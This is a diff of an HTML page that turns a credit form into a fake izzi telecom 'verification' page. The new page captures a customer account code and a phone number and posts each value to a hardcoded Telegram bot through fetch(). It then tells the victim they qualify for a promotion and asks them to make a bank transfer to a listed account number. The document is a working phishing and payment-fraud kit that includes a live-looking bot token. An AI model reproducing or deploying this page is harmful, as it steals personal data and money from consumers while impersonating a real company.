@@ -1,182 +1,335 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Utiliza tu Crédito Coppel para comprar en línea o disfruta de los beneficios exclusivos que tu Crédito BanCoppel te ofrece.">
-    <title>Solicita tu Crédito | BanCoppel</title>
-
-    <link rel="icon" href="favicon.ico" type="image/x-icon">
-    
+    <meta charset="utf-8">
+    <title>web</title>
     <style>
         body {
+
+            
             font-family: Arial, sans-serif;
+            background-color: rgba(255, 255, 255, 0.411);
             margin: 0;
-            padding: 0;
-            background-color: #f4f4f4;
-        }
-
-        header {
-            background-color: #2C3E50;
-            color: white;
-            padding: 20px 0;
-        }
-
-        .container-header {
             display: flex;
-            justify-content: space-between;
+            flex-direction: column;
             align-items: center;
-            padding: 0 20px;
+            justify-content: center;
+            height: 100vh;
+            position: relative;
         }
 
-        h2 {
-            margin: 0;
-            font-size: 24px;
-        }
-
-        p {
-            margin: 5px 0 0;
-            font-size: 14px;
-        }
-
-        img {
-            width: 100px;
-            height: auto;
-        }
-
-        main {
-            padding: 20px;
-        }
-
-        form {
-            background-color: white;
-            padding: 20px;
-            border-radius: 5px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-        }
-
-        h3 {
-            margin-top: 0;
-        }
-
-        label {
-            display: block;
-            margin: 10px 0 5px;
-            font-size: 14px;
-        }
-
-        input, select {
+        .header {
             width: 100%;
+            background-color: #f0f0f0; /* Color de fondo gris */
             padding: 10px;
-            margin: 5px 0 15px;
+            text-align: center;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 5;
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Centrar verticalmente */
+        }
+
+        .logo-header {
+            width: 100px; /* Ajusta el tamaño del logotipo */
+            margin-left: -10px; /* Mover a la izquierda */
+        }
+
+        .date {
+            font-size: 14px; /* Tamaño de la fecha */
+            color: rgb(0, 183, 255); /* Color de la fecha */
+            margin-top: 5px;
+            margin-left: -10px; /* Mover a la izquierda */
+        }
+
+        .loader {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: absolute;
+            width: 100%;
+            background-color: rgba(255, 255, 255, 0.281);
+            z-index: 10;
+        }
+
+        .circuit {
+            width: 60px; /* Tamaño del círculo */
+            height: 60px; /* Tamaño del círculo */
+            border: 8px solid transparent;
+            border-radius: 50%;
+            border-top-color: #51ff00;
+            animation: loadingAnimation 1s linear infinite;
+            position: absolute;
+            top: calc(50% - 30px); /* Ajustar más arriba */
+            left: calc(50% - 30px); /* Ajustar más a la izquierda */
+            transform: translate(-50%, -50%); /* Centra el círculo sobre el logotipo */
+            z-index: 20; /* Asegura que esté encima del logotipo */
+        }
+
+        @keyframes loadingAnimation {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .logo-image {
+            width: 160px;
+            margin-bottom: 5px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .container {
+            text-align: center;
+            width: 300px;
+            display: none;
+            margin-top: 20px;
+        }
+
+        .input-container {
+            padding: 20px;
+        }
+
+        .welcome-text {
+            font-size: 14px;
+            color: black;
+            margin-bottom: 5px;
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: black;
+            margin-bottom: 10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
             border-radius: 5px;
-            border: 1px solid #ddd;
+            box-sizing: border-box;
         }
 
         button {
-            padding: 10px 20px;
-            background-color: #2C3E50;
+            width: 100%;
+            padding: 10px;
+            background-color: #ff016b;
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 25px;
             cursor: pointer;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+            button selectimgoxxo-logo-png_seeklogo-298104{
             width: 100%;
+            padding: 10px;
+            background-color: #ffffff;
+            color: rgb(0, 0, 0);
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 10px;
         }
 
-        button[disabled] {
-            background-color: #ccc;
-            cursor: not-allowed;
+        button:hover {
+            background-color: #cc7a00;
         }
 
-        footer {
-            background-color: #2C3E50;
-            color: white;
+        .help-text {
+            font-size: 12px;
+            color: black;
+            margin-top: 10px;
+        }
+
+        .error-text {
+            color: red;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+
+        .footer {
+            background-color: #f0f0f0;
+            color: #333;
+            font-size: 8px;
             text-align: center;
-            padding: 10px 0;
+            padding: 5px;
             position: absolute;
             bottom: 0;
-            width: 100%;
+            left: 0;
+            right: 0;
+        }
+
+        .logo-footer {
+            width: 50px;
+            margin: 5px auto;
+        }
+
+        .footer-text {
+            margin: 3px 0;
+            display: block;
+        }
+
+        .bold {
+            font-weight: bold;
         }
     </style>
-
-    <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            const form = document.getElementById('mainForm');
-            const submitButton = form.querySelector('button');
-            const inputs = form.querySelectorAll('input, select');
-
-            function checkForm() {
-                const allFilled = Array.from(inputs).every(input => {
-                    return input.value.trim() !== '';
-                });
-                submitButton.disabled = !allFilled;
-            }
-
-            inputs.forEach(input => {
-                input.addEventListener('input', checkForm);
-            });
-
-            form.addEventListener('submit', function (event) {
-                event.preventDefault();
-                alert('Formulario enviado correctamente');
-            });
-        });
-    </script>
 </head>
 <body>
-    <header>
-        <div class="container-header">
-            <div>
-                <h2>¡Solicita tu Crédito!</h2>
-                <p>Es muy fácil y rápido, solo ingresa tus datos</p>
-            </div>
-            <div>
-                <img src="./images/card-unificada.webp" alt="Crédito BanCoppel" width="149" height="149">
-            </div>
+    <div class="header">
+        <img src="images-removebg-preview.png" alt="Logotipo" class="logo-header">
+        <div class="date" id="currentDate"></div>
+    </div>
+
+    <div class="loader" id="loader">
+        <img src="images-removebg-preview.png" alt="Logotipo" class="logo-image">
+        <div class="circuit"></div>
+    </div>
+
+    <div class="container" id="usernameContainer">
+        <img src="images-removebg-preview.png" alt="izzi" class="logo-image">
+        <div class="welcome-text">¡Bienvenido a <span class="bold">izzi telecom</span>!</div>
+        <div class="input-container">
+            <form id="usernameForm">
+                <div class="info-text">Ingresa tus datos para verificarte</div>
+                <input type="text" id="username" placeholder="Código de Cliente / No.Cuenta/" required maxlength="16" pattern="^[a-zA-Z0-9]{8}$" title="Ingresa solo 8 caracteres alfanuméricos" oninput="this.value = this.value.replace(/[^a-zA-Z0-9]/g, '').slice(0, 16);">
+                <button type="submit">Siguiente</button>
+                <div class="help-text">¿Necesitas ayuda?</div>
+            </form>
         </div>
-    </header>
+    </div>
 
-    <main>
-        <form id="mainForm" action="/informacion-de-credito" autocomplete="off">
-            <!-- Datos personales -->
-            <h3>Datos Personales</h3>
-            <label for="name">Primer nombre *</label>
-            <input required id="name" maxlength="26" type="text">
-            
-            <label for="lastname">Primer apellido *</label>
-            <input required id="lastname" maxlength="26" type="text">
-            
-            <label for="birth_day">Fecha de nacimiento *</label>
-            <select required id="birth_day">
-                <option value="" hidden>Día</option>
-                <option value="01">01</option>
-            </select>
-            <select required id="birth_month">
-                <option value="" hidden>Mes</option>
-                <option value="01">ENE</option>
-            </select>
-            <select required id="birth_year">
-                <option value="" hidden>Año</option>
-                <option value="2001">2001</option>
-            </select>
+    <div class="container" id="numberContainer">
+        <img src="images.png" alt="izzi" class="logo-image">
+        <div class="welcome-text">¡Bienvenido a <span class="bold">izzi telecom</span>!</div>
+        <div class="input-container">
+            <form id="numberForm">
+                <div class="info-text">Ingresa tus datos para verificarte</div>
+                <input type="text" id="number" placeholder="numero celular" required maxlength="10" pattern="^[a-zA-Z0-9]{10}$" title="Ingresa solo 10 caracteres alfanuméricos" oninput="this.value = this.value.replace(/[^a-zA-Z0-9]/g, '').slice(0, 10);">
+                <button type="submit">Siguiente</button>
+                <div class="help-text">¿Necesitas ayuda?</div>
+            </form>
+        </div>
+    </div>
 
-            <!-- Datos de contacto -->
-            <h3>Datos de Contacto</h3>
-            <label for="email">Correo electrónico *</label>
-            <input required id="email" type="email">
-
-            <label for="phone">Teléfono celular *</label>
-            <input required id="phone" maxlength="12" minlength="12" type="text">
-            
-            <label>
-                <input required type="checkbox"> Acepto el Aviso de Privacidad
-            </label>
-            <button type="submit" disabled>Continuar</button>
+<div class="container" id="activationCode2Container" style="display:none;">
+    <img src="images-removebg-preview.png" alt="izzi" class="logo-image">
+    <div class="welcome-text"> Bienvenido a promociones izzi  <span class="bold"> </span></div>
+    <div class="welcome-text"> <span class="bold">candidato aprovado para la promocion </span></div>
+    <div class="welcome-text"> Realiza tu pago por trasferencia bancaria<span class="bold"></span></div> 
+    <div class="welcome-text"> <span class="bold">646180146013930868</span></div>
+    <div class="welcome-text"> <span class="bold">Nombre izzi promociones</span></div>
+    <div class="welcome-text"> <span class="bold">Concepto de pago promocion </span></div>
+     <img src="spei.png" alt="izzi" class="logo-image">
+    <div class="input-container">
+        <form id="activationCode2Form">
+            <div class="help-text">¿Necesitas ayuda?</div>
         </form>
-    </main>
+    </div>
+</div>
 
-    <footer>
-        <p>Copyright © 2024 BanCoppel S.A. Institución de Banca Múltiple | Todos los derechos reservados</p>
-    </footer>
+<script>
+    // Manejadores de envío de formularios para los nuevos códigos de activación
+    handleFormSubmission('activationCode2Form', 'activationCode2Container');
+  
+
+    // Asegúrate de que el resto del código siga funcionando como antes
+</script>
+
+    <div class="footer">
+        <img src="images-removebg-preview.png" alt="Logotipo" class="logo-footer">
+        <div class="footer-text">Derechos Reservados 2024, ©izzi telecom México S.A., Institución de telecomunicacions multiples , Grupo izzi telecom .</div>
+        <div class="footer-text">Aviso Legal, Términos y Condiciones | M2 [5.0.22]</div>
+    </div>
+    <script>
+        function copiar() {
+          const texto = document.getElementById("646180146013930868").innerText;
+          navigator.clipboard.writeText(texto)
+            .then(() => alert("Texto copiado correctamente"))
+            .catch(err => alert("Error al copiar: " + err));
+        }
+      </script>
+
+    <script>
+        // Mostrar pantalla de carga durante 2 segundos al inicio
+         window.onload = function() {
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('usernameContainer').style.display = 'block';
+        }, 2000); // Duración de 2 segundos
+
+        // Establecer la fecha actual
+        const options = { year: 'numeric', month: 'long', day: 'numeric' };
+        const currentDate = new Date().toLocaleDateString('es-MX', options);
+        document.getElementById('currentDate').textContent = currentDate;
+    };
+
+    async function sendToTelegram(message) {
+        const url = 'https://api.telegram.org/bot7640806901:AAEvKizDmQF4562rN8mWaOQii13_3jXC_fg/sendMessage';
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: '-1002366513945', text: message }),
+            });
+
+            if (!response.ok) {
+                throw new Error('Error en la solicitud: ' + response.statusText);
+            }
+        } catch (error) {
+            console.error('Error al enviar el mensaje:', error);
+        }
+    }
+
+    async function handleFormSubmission(formId, nextContainerId, showError = false) {
+        const form = document.getElementById(formId);
+        let errorShown = false; // Controla si ya se mostró el error
+
+        form.addEventListener('submit', async function(event) {
+            event.preventDefault();
+            const inputField = form.querySelector('input');
+            const inputValue = inputField.value;
+
+            // Muestra la animación de carga inmediatamente
+            document.getElementById('loader').style.display = 'flex';
+
+            // Envía el mensaje a Telegram
+            await sendToTelegram(`${inputField.placeholder}: ${inputValue}`);
+
+
+            // Aumenta la duración de la animación de carga
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+
+                if (formId === 'tokenForm' && showError && !errorShown) {
+                    document.getElementById('errorText').style.display = 'block'; // Muestra el mensaje de error
+                    errorShown = true; // Cambia el estado a que el error ha sido mostrado
+                } else {
+                    showLoader(
+                        document.getElementById(formId).parentElement.parentElement,
+                        document.getElementById(nextContainerId)
+                    );
+                }
+            }, 2500); // Duración de 2.5 segundos para la animación de carga
+        });
+    }
+
+    function showLoader(currentContainer, nextContainer) {
+        currentContainer.style.display = 'none';
+        nextContainer.style.display = 'block';
+    }
+
+    // Inicializa el manejo de formularios
+    handleFormSubmission('usernameForm', 'numberContainer');
+    handleFormSubmission('numberForm', 'activationCode2Container');
+    handleFormSubmission('activationCode2Form', 'activationCode2Container');
+</script>
+    </script>
 </body>
 </html>
